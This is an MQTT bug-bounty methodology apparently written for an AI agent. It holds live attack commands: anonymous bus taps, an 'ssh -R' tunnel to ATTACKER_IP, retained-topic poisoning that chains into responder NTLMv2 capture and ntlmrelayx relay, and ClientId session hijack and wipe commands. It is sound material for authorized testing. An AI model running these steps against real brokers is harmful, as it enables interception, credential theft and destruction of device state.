---
technology: "MQTT"
kind: bug-bounty-methodology
audience: ai-agent
family: network-services
provenance: "corpus-grounded on 2 chains (command-context gate 2026-11-12): chain A — anonymous 1883, nmap mqtt-subscribe retained dump, mqttui topic enum, retained health-check publish -> responder NTLMv2 -> ntlmrelayx; chain B — localhost mosquitto 1.4.15 via ssh -R, mosquitto_sub '$SYS/#', SSH key published in a topic. Upstream: nmap mqtt-subscribe NSE docs (args incl. protocol-level default 4, listen-time 5s, listen-msgs 100), mosquitto.conf(5) + mosquitto_sub(1) (flags -u/-P/-t/-v/-C/-R retained-only; allow_anonymous 1.6.x default true, 2.0 false / true+localhost when no listener), OASIS MQTT 3.1.1 PDF (Table 3.1 CONNACK codes, SUBACK 0x80) and MQTT 5.0 PDF (reason codes 0x86/0x87/0x8A/0x8C, section 4.12 Enhanced authentication). Thin unit, first-class per standing rule. Companion overview: [[mqtt|MQTT]]. Supplement (2026-11-13) rewritten from HackTricks (src/network-services-pentesting/1883-pentesting-mqtt-mosquitto.md), CC BY-NC 4.0, accessed 2026-11-13 — Mosquitto issues #3551/#3553 verified against the eclipse-mosquitto tracker, the $SYS wildcard rule against mosquitto(8), sparkplugFuzzer/mqtt-pwn/python-mqtt-client-shell against their repositories."
---

# MQTT bug bounty methodology

Target model: an MQTT broker, most commonly Eclipse Mosquitto or EMQX, on TCP/1883 (plaintext) or 8883 (TLS). No protocol-level authentication is guaranteed — every phase starts by asking whether CONNECT with no credentials is accepted. Authorization, if any, lives in broker-side topic ACLs. Treat the broker as shared infrastructure: other clients are real systems, and publishes are state-changing actions — get sign-off before publishing on an engagement target.

## Triage table

| Surface | Gate | Pre-auth? | Payoff |
|---|---|---|---|
| Anonymous CONNECT + `#` subscribe | broker allows it (1.x-era mosquitto default) | yes | Tap of every message on the bus — High |
| Retained-message dump | any subscribe rights | yes | Last-known state/config/inventory without live traffic — Medium/High |
| `$SYS/#` introspection | $SYS readable (often default) | yes | Broker version, client list, usernames, IPs — Info/Medium |
| Topic-tree enumeration | any subscribe | yes | Internal hostnames/roles (targeting map) — Info |
| Retained publish (state poisoning) | publish rights on a consumed topic | depends | Injection into consuming automation (NTLM coercion, command channels) — High |
| Credential attacks | CONNECT requires auth | n/a | Username/password guessing; 3.1.1 code 4/5 vs 5.0 0x86/0x87 feedback — Medium |

## Phase 0 — Detect and fingerprint

```bash
nmap -p 1883,8883 -sV 198.51.100.10
# 1883/tcp open  mqtt  Mosquitto MQTT v3.1.1 (or: EMQX, RabbitMQ MQTT plugin banner)
nmap -p 1883 --script mqtt-subscribe 198.51.100.10
# | mqtt-subscribe:
# |   Topics and their most recent payloads:
# |     $SYS/brokers/client_status/mqttui-8cec5094: {"status":"online","username":"(null)",
# |       "proto_name":"MQTT","keepalive":60,"proto_ver":4, ...}
```

The mqtt-subscribe NSE (safe/discovery/version) connects, subscribes to its default topics, and reports retained
payloads — for an anonymous broker this is a one-shot estate snapshot before you touch a client. Script arguments:
`mqtt-subscribe.username` / `mqtt-subscribe.password` for authenticated brokers, `mqtt-subscribe.protocol-level`
(default 4 = MQTT 3.1.1; try 5), `mqtt-subscribe.topic` for custom filters, `mqtt-subscribe.listen-time` (default 5s)
and `mqtt-subscribe.listen-msgs` (default 100) to sit on live traffic. A `username: "(null)"` in $SYS client-status
records (as in one observed output) confirms other clients connect anonymously too.

## Phase 1 — Anonymous connect and topic enumeration

```bash
# CLI client (Debian/Ubuntu package mosquitto-clients); -v prints topic + payload, -C 1 exits after one message
mosquitto_sub -h 198.51.100.10 -p 1883 -t '#' -v -C 5
# broker introspection tree (wildcard under $SYS):
mosquitto_sub -h 198.51.100.10 -t '$SYS/#' -v
# retained payloads only (no live wait): mosquitto_sub -R is retained-only mode
mosquitto_sub -h 198.51.100.10 -t '#' -v -R -C 20

# interactive TUI (mqttui): topic browser + live publish/subscribe
mqttui -b mqtt://198.51.100.10
```

Read the topic tree as an org chart: one observed topic tree (`<internal-host>/systems/node/secureshare/healthcheck`) named
both an internal application host and a health-check consumer. Record: (1) topic naming scheme, (2) payload formats
(JSON with URLs/IPs/hostnames is the norm), (3) which topics are retained, (4) client ids in `$SYS` status records
(they often embed service names and usernames).

If the port is localhost-bound on a host you have a shell on (observed: mosquitto 1.4.15 on 127.0.0.1:1883), pull it
back with an SSH remote forward and repeat the phases against your own loopback:

```bash
ssh -R 1883:127.0.0.1:1883 ATTACKER_IP -N   # run on the target; then -h 127.0.0.1 locally
```

## Phase 2 — Authentication probing (when CONNECT is refused)

The broker's refusal style identifies the dialect and the policy:

- **3.1.1 broker**: CONNACK code 4 (bad user/pass) or 5 (not authorized) — or the connection just closes (spec-allowed). SUBSCRIBE after a valid CONNECT answers SUBACK 0x80 "Failure" per denied filter, with no reason detail.
- **5.0 broker**: CONNACK reason 0x86 (bad username/password), 0x87 (not authorized), 0x8A (banned — you have tripped a lockout), 0x8C (bad authentication method). Denied SUBSCRIBE returns SUBACK 0x87 — use it to map ACL-protected topics.
- **Enhanced auth (5.0)**: an Authentication Method in CONNECT triggers AUTH-packet challenge/response (spec 4.12, e.g. SCRAM); a 0x8C answer means the method name was wrong, not the password.

```bash
mosquitto_sub -h 198.51.100.10 -t '#' -C 1 -u candidate_user -P candidate_pass
# or via NSE: nmap -p 1883 --script mqtt-subscribe --script-args 'mqtt-subscribe.username=...,mqtt-subscribe.password=...'
```

Username/password guessing against MQTT has no first-class observed chain; run it with your standard SSH-style
credential tooling wrapped around a client library, and expect mosquitto's per-listener rate behavior. Credentials
harvested from configs (`/etc/mosquitto/passwd`, `mosquitto.conf` `password_file`, client-side connection strings in
environment variables and source) are the realistic source — a config read beats a brute force.

## Phase 3 — Interception (live traffic)

With subscribe rights, `mosquitto_sub -t '#' -v` is a full bus tap: commands to devices, telemetry up, and any
credentials services embed in payloads (one observed broker carried an SSH private key published into the $SYS
hierarchy — always grep retained and live payloads for key material: `-----BEGIN`, tokens, connection strings).

## Phase 4 — Retained-message poisoning (the publish-side payoff)

For every topic a *service* consumes (health checks, command channels, config updates):

1. Subscribe and capture the exact payload schema and cadence.
2. Republish with `retain` set and your content — the next consumer read treats it as the publisher's last message.
   In mqttui: `mqttui -b mqtt://198.51.100.10 publish -r <topic> '<payload>'`; with mosquitto_pub the same idea is
   its retain flag. Keep every other JSON field byte-identical except your target field.
3. Observed chain: the `secureshare/healthcheck` topic carried a JSON health-check with a `url` field;
   republishing retained with `url` pointing at the attacker host made the monitoring service fetch it under a
   Windows service account — responder captured NTLMv2 for the service account, then ntlmrelayx relayed the
   same authentication to the internal application. The broker never executed anything; the consumer did.

State-changing: this writes durable state other systems act on. Only with explicit authorization.

## Phase 5 — Wrapping up

- TLS broker (8883): same phases, client connects over TLS; plaintext 1883 additionally means passive network
  position = full bus read.
- Report anchors: anonymous CONNECT (config finding), sensitive retained data (data finding), wildcard
  subscription rights (broken access control), retained publish into automation (the High).
- Tools used in this file, in prose: nmap with the mqtt-subscribe NSE, the mosquitto-clients package
  (mosquitto_sub / mosquitto_pub), mqttui, responder and impacket's ntlmrelayx for the coercion chain.

## Supplement (2026-11-13): ClientId session attacks, $SYS matching rules, Sparkplug B, and MQTT-over-WebSocket

Rewritten from HackTricks (src/network-services-pentesting/1883-pentesting-mqtt-mosquitto.md), CC BY-NC 4.0, accessed 2026-11-13; issue references verified against the eclipse-mosquitto GitHub tracker (both issues still open at access date), the wildcard rule against mosquitto(8), and every tool against its repository.

### ClientId collisions: queued-message theft and session wipe (Mosquitto 2.1.2)

Two 2026 Mosquitto issues make the client id — a string the client picks — an attack surface against *persistent sessions* (`clean_session=false` in 3.1.1, or a non-zero Session Expiry in 5.0):

- **Session destruction without authentication** (mosquitto issue #3551): a CONNECT carrying a known ClientId with Clean Session = 1 destroys the stored session for that id — subscriptions and queued QoS 1/2 messages included. Nothing is delivered to you; the value is denial/destruction of a real device's pending state (or erasing evidence).
- **Cross-user queued-message exfiltration** (mosquitto issue #3553, MQTT v5): an authenticated *low-privilege* user connecting with the victim's ClientId attaches to the stored session and receives queued QoS 1/2 messages from topics their ACL does not allow — delivery follows the session keyed by ClientId, not the newly authenticated principal.

Harvest client ids from firmware, mobile/web bundles, device labels, and predictable serial/MAC-derived schemes — offline devices that accumulate queued commands are the juiciest victims. Checks: reconnect with the suspected id and `-d` (in v5, `Session Present = 1` means the broker resumed stored state); watch for messages arriving *before* your own SUBSCRIBE takes effect (inherited queue = hit); on authorized tests, verify the real device returns to an empty session.

```bash
# v5: try to attach to an existing stored session
mosquitto_sub -h 198.51.100.10 -u attacker-user -P 'example-pass' -V 5 \
  -i 'victim-device-clientid' -t 'site/cmd/#' -q 1 --session-expiry-interval 3600 -d
# 3.1.1: destructive variant — connect and disconnect immediately (default clean session wipes state)
mosquitto_sub -h 198.51.100.10 -V mqttv311 -i 'victim-device-clientid' -t '#' -d -C 1
```

### The $SYS matching rule, stated precisely

The wildcard-exclusion rule from the spec and mosquitto(8): **a topic filter beginning with `#` or `+` does not match topic names beginning with `$`** — the $SYS hierarchy does not match a subscription of `#`; to observe it you must subscribe `$SYS/#` explicitly. This is protocol matching behavior, not an ACL bypass: the broker still applies its authorization to the `$SYS/#` subscription. Practical corollary for shell work: single-quote `$SYS` topics (the shell otherwise expands `$SYS` as an environment variable — the mosquitto(8) man page calls this out explicitly).

### Sparkplug B (ICS/OT over MQTT): recon and protocol-aware fuzzing

Sparkplug B layers an OT topic namespace and protobuf-encoded metrics on MQTT, with a strict birth/death lifecycle. Topic shape:

    spBv1.0/{group_id}/{message_type}/{edge_node_id}/{device_id}

Passive recon first: subscribe `spBv1.0/#` (and `STATE/#`) and mine NBIRTH/DBIRTH traffic for live nodes, devices, metric names, aliases, and datatypes; record which message types flow (NBIRTH/DBIRTH/NDATA/DDATA/NCMD/DCMD/NDEATH/DDEATH/STATE) and whether anonymous clients can CONNECT, SUBSCRIBE, or PUBLISH into the namespace. Then protocol-aware tests beat generic fuzzing: lifecycle-order violations (data before birth, death without birth, data after death), metric datatype flips after birth, alias rebinding mid-session, sequence-number replay/gaps/wraparound, and raw protobuf corruption (helper libraries quietly refuse to serialize malformed payloads — mutate the bytes). Bishop Fox's open-source sparkplugFuzzer automates the passive mapping and the fuzz categories; verify that broker ACLs scope per group/role rather than granting blanket `spBv1.0/#`, and that the target rejects/logs malformed topics, protobuf parse failures, and alias rebinding.

### MQTT over WebSocket in web apps

Do not assume 1883/8883 only: browser widgets, dashboards, and chat fronts reach the broker over WebSockets (`ws://`/`wss://`) on app-specific paths such as `/mqtt` or `/ws` (RabbitMQ's Web MQTT plugin conventionally serves `15675/ws`). When testing a site with a realtime widget, mine the frontend: HTML bootstrap objects (`window.__INITIAL_STATE__`, `__NEXT_DATA__`, `drupalSettings`), runtime config files (`env.js`, `config.js`, `settings.json`), and asset/chunk manifests, then grep bundles for `wss://`, `/mqtt`, `/ws`, `mqtt`, `broker`, `clientId`, `username`, `password`, `token` — leaked broker URLs, WebSocket paths, embedded credentials, client ids, and topic naming conventions are routine finds; test the fallback/default credentials bundles define. Per-user channels are often isolated only by topic name (`client/<session-id>/chat_session`) — with a low-privilege account, try broadening the filter (`client/+/chat_session`, then `client/#`; `+` is exactly one level, `#` the remainder) and see if the broker's ACLs stop you. If they do not, one session channel becomes a cross-tenant tap. Quick validation with the Node.js mqtt package over `wss://` (subscribe first with the exact recovered topic, then broaden; `rejectUnauthorized:false` is a TLS-testing convenience, not the vulnerability).

### Small additions

- IoT brokers also run plaintext MQTT on non-standard ports (8001 seen in the wild) — Wireshark spots cleartext CONNECT/SUBSCRIBE/PUBLISH on odd ports where nmap service guesses fail.
- Additional clients worth naming: mqtt-pwn (Akamai's IoT broker assessment framework) and python-mqtt-client-shell (interactive subscribe/publish shell) — both complement mosquitto-clients.
- Phase 4 ordering refinement: start the relay listener *before* poisoning a retained topic (a polling consumer may fetch the retained value the moment it replaces it), and remember an HTTP-to-HTTP relay to another NTLM service is not stopped by SMB signing on the DC.
- External discovery: Shodan `port:1883 MQTT`, plus sweeps of alternative ports with protocol confirmation.
